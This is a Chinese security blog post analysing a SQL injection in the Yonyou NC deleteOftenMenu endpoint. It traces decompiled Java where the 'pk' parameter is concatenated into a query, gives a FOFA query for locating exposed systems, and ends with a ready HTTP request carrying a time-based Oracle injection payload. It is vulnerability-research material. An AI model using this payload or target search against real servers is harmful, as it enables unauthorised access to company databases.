---
title: "用友NC deleteOftenMenu SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-deleteMenu-deleteOftenMenu-pk-sqli.html
asset_dir: assets/用友nc-deleteoftenmenu-sql注入漏洞
---

# 用友NC deleteOftenMenu SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/11 18:49
* 729浏览
* [0评论](#comment)
* 1小时阅读

深入探索

SQL

软件

server


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用deleteOftenMenu传入的参数实现SQL注入，从而窃取服务器的敏感信息。

SQL注入防护

# 影响版本

NC63、NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知 deleteOftenMenu 为注入点

[![用友NC deleteOftenMenu SQL注入漏洞](images/img-001-33de702a30ae.webp)](https://image.mrxn.net/74c4f99bcce44aa5a1fa6f08230c9f20.webp)

因此搜索 deleteOftenMenu 方法的实现部分即可定位业务逻辑实现代码

代码安全审计

```
package nc.uap.portal.action;

import java.util.Map;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.crud.CRUDHelper;
import nc.uap.lfw.core.data.PaginationInfo;
import nc.uap.lfw.core.exception.LfwBusinessException;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.core.log.LfwLogger;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.lfw.util.LanguageUtil;
import nc.uap.portal.vo.PtRegularItemVO;
import nc.vo.ml.NCLangRes4VoTransl;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/deleteMenu"
)
public class DeleteOftenMenuAction extends BaseAction {
    public DeleteOftenMenuAction() {
    }

    @Action
    public void deleteOftenMenu() {
        String pk = this.request.getParameter("pk");
        String pk_user = LfwRuntimeEnvironment.getLfwSessionBean().getPk_user();

        try {
            PtRegularItemVO[] vos = (PtRegularItemVO[])CRUDHelper.getCRUDService().queryVOs("pk_user='" + pk_user + "' and pk_funcnode='" + pk + "'", PtRegularItemVO.class, (PaginationInfo)null, (String)null, (Map)null);
            String res = "";
            StringBuffer jstip = new StringBuffer();
            if (vos != null && vos.length > 0) {
                CRUDHelper.getCRUDService().deleteVo(vos[0]);
                res = LfwResBundle.getInstance().getStrByID("pmng", "MainViewController-000014");
                jstip.append("if(parent){parent.modRegMenu('" + pk + "');parent.showMessageDialog('").append(res).append("');}");
            } else {
                res = LanguageUtil.getString("pserver", "DeleteOftenMenuAction-000002");
                jstip.append("if(parent)parent.showMessageDialog('").append(res).append("');");
            }

            this.addExecScript(jstip.toString());
        } catch (LfwBusinessException e) {
            LfwLogger.error(e.getMessage(), e);
            throw new LfwRuntimeException(NCLangRes4VoTransl.getNCLangRes().getStrByID("pserver", "DeleteOftenMenuAction-000000"), e);
        }
    }
}
```

深入探索

云安全解决方案

授权

网页浏览器

pk 直接拼接进SQL语句后，带入 queryVOs 函数，其实现逻辑如下

漏洞扫描服务

```
public <M extends SuperVO> M[] queryVOs(String sql, Class<M> clazz, PaginationInfo pg, String orderBy, Map<String, Object> extMap) throws LfwBusinessException {
        return (M[])(((ILfwQueryService)ServiceLocator.getService(ILfwQueryService.class)).queryVOs(sql, clazz, pg, orderBy, extMap));
    }
public <T extends SuperVO> T[] queryVOs(String sql, Class<T> clazz, PaginationInfo pg, String orderBy, Map<String, Object> extMap) throws LfwBusinessException {
        ResultSetProcessor rp = null;
        PersistenceManager pm = null;

        SuperVO vo;
        try {
            pm = PersistenceManager.getInstance();
            JdbcSession ses = pm.getJdbcSession();
            if (!sql.trim().toLowerCase().startsWith("select ")) {
                vo = (SuperVO)LfwClassUtil.newInstance(clazz);
                String table = vo.getTableName();
                if (sql.indexOf(".") != -1) {
                    String prez = sql.substring(0, sql.indexOf("."));
                    table = table + " " + prez;
                }

                Map<String, Integer> types = this.getColmnTypes(vo.getTableName(), ses);
                sql = SQLHelper.getSelectSQL(table, this.getTableFields(vo, types)) + " " + "where" + " " + sql;
            }

            ResultSetProcessor var17 = new BeanListProcessor(clazz);
            vo = this.queryVOByPinfo(ses, sql, orderBy, (SQLParameter)null, pg, clazz, pm, var17);
        } catch (DbException e) {
            Logger.error(e.getMessage(), e);
            throw new LfwBusinessException(e.getMessage());
        } finally {
            if (pm != null) {
                pm.release();
            }

        }

        return (T[])vo;
    }
```

经过 getSelectSQL 处理带入 queryVOByPinfo，getSelectSQL 实现如下

计算机服务器

```
public static String getSelectSQL(String tableName, String[] fields) {
        StringBuffer sql = new StringBuffer();
        if (fields == null) {
            sql.append("SELECT * FROM " + tableName);
        } else {
            sql.append("SELECT ");

            for(int i = 0; i < fields.length; ++i) {
                sql.append(fields[i] + ",");
            }

            sql.setLength(sql.length() - 1);
            sql.append(" FROM " + tableName);
        }

        return sql.toString();
    }
```

queryVOByPinfo 实现如下

编程

```
private <T extends SuperVO> T[] queryVOByPinfo(JdbcSession ses, String sql, String orderByPart, SQLParameter param, PaginationInfo pg, Class voclass, PersistenceManager pm, ResultSetProcessor rp) throws DbException {
    StringBuffer tempSql = new StringBuffer(sql);
    if (pg != null && pg.getPageSize() != -1) {
        if (pg.isRecalc()) {
            String countSql = this.getCountSql(sql);
            Map obj = (Map)ses.executeQuery(countSql, param, new MapProcessor());
            int recordsCount = (Integer)obj.get("c");
            pg.setRecordsCount(recordsCount);
        }

        int index = pg.getPageIndex();
        int lastPage = pg.getPageCount() - 1;
        if (index > lastPage) {
            if (!pg.isProcessLastpage()) {
                List<T> temp = new ArrayList(0);
                return (T[])(temp.toArray((SuperVO[])Array.newInstance(voclass, 0)));
            }

            index = lastPage;
            pg.setPageIndex(lastPage);
        }

        if (orderByPart != null && !"".equals(orderByPart)) {
            if (!orderByPart.trim().toLowerCase().startsWith("order ")) {
                tempSql.append(" order by ");
            }

            tempSql.append(" ").append(orderByPart);
        }

        LimitSQLBuilder builder = SQLBuilderFactory.getInstance().createLimitSQLBuilder(pm.getDBType());
        int pageSize = pg.getPageSize();
        sql = builder.build(tempSql.toString(), index + 1, pageSize);
        Object list = ses.executeQuery(sql, param, rp);
        return (T[])(((List)list).toArray(Array.newInstance(voclass, 0)));
    } else {
        if (orderByPart != null && !"".equals(orderByPart)) {
            if (!orderByPart.trim().toLowerCase().startsWith("order ")) {
                tempSql.append(" order by ");
            }

            tempSql.append(" ").append(orderByPart);
        }

        Object list = ses.executeQuery(tempSql.toString(), param, rp);
        return (T[])(((List)list).toArray(Array.newInstance(voclass, 0)));
    }
}
```

最终调用 executeQuery 执行SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

同样因为存在 `LfwRuntimeEnvironment.getLfwSessionBean()` ，漏洞利用需要登录权限

编程

```
GET /portal/pt/deleteMenu/deleteOftenMenu?pageId=login&pk=1'AND+1=dbms_pipe.receive_message('RDS', 6)-- HTTP/1.0
Host: nc65.mrxn.net
Cookie: JSESSIONID=xx.server
```

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=637`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC deleteOftenMenu SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-deleteMenu-deleteOftenMenu-pk-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-deleteMenu-deleteOftenMenu-pk-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-deleteMenu-deleteOftenMenu-pk-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALAElEQVR4Aeyci3Ljxg5EdfL//5xrqOvQHHBGlB+xVHW5tbOHaDTA0YDM2k4q/9xut3+/s/5d/DrrZVn3qUvzPe66+aK5zsrNlj5zX43P6uz3FdZAPvzX73c5gW0gH9O+PbP6xoEbfC576DOW6p3w2QPY9qLPegmjH4411kK8xp2QfO/dfT0Pqes+Y/1n1F/cBlLBtV5/AoeBQKYOI1dbdfo9rw7ps8p3vceQegh7fh/D6HEPEpKHcF87u+51etSNzwi5H4yc1R0GMjNd2t+dwK8NpD81kKdBHRJD6Ec0byzhsc+6R1z1UrfWeEV9MO5Jv3njn/DXBvKTTVy1nyfwawOB8enxqYHndLdkXY8hfeDrtKe0dyek98rX9R73ft+Jf20g37n5VXM8gcNAnHrnsTQKTJ6qpO5/9j4w+mEe34s//oAx/yHdf/e++/humPwBYy9IrNUexhLig5Hmz2jfzlndYSAz06X93QlsA4Fx+jCPz7YGqdMHY6x+Rp+mMx+kP3Cw2gO4/zRhFfdCiL/r1ncd5n6IDo+577cNZC9e1687gX+c+ld5tmXIU2Hfr/rhuXr7F5+9x5nPPIx7gDHW11l7+e663pB+mi+OTwcCeSpgTp8ESL5/HogOYc9bL2Hu63UQHxzZvfZWN4bUqkvzxp2QOgi/mtcPx/rTgVh88W9O4B/IlGCkt/dp6TQPqev5sxhSByPta72xVH9EvWfsPSB7sc78Ku46zOshOoS9zrh4vSF1Cm+0tq+y+p5gnKZ5GHWfIogOI3sdJK9ufSfEB+HtdruXwDyG6MDdV38A9+8/ICztOwvm9e551RNSp09CdAj39dcbsj+NN7jeBuL0+p5gnGL3QfJdN4bH+dX9rJf6VnHpes4I2ZM+GOOVDo99tYda1td1LZjXVa6W/uI2kAqu9foT2L7KWm2lJljLPIzTrlwtGHX9neWt1XVIfeVqQWIIu38WV92jZY0eSG9j8yue+SD9rIcxVpeQPHzyekM8nTfhNhDIlHwKZN+nuoTn6iA+CHvfHtu/65B6OPLM2/PGkF79nj3W37nyqUvIfaxX33MbiKaLrz2Bw0BgnCI8jp0ujL7+sfSpw+g3D9Eh7H59M+r9Ku0F4z17HxjzMMb26XWrGMb68h0GUuK1XncC20CcrnRLxpBpGpuXXYe5f+Vb9el+fZD+xkUYtVVtebf1cQFjHYzxh+X+237yLj7xBzzut2+xDWQvXtevO4FtIJApQrjaEszzMNdXfdR92uBxvb5eZ1zUA2Mv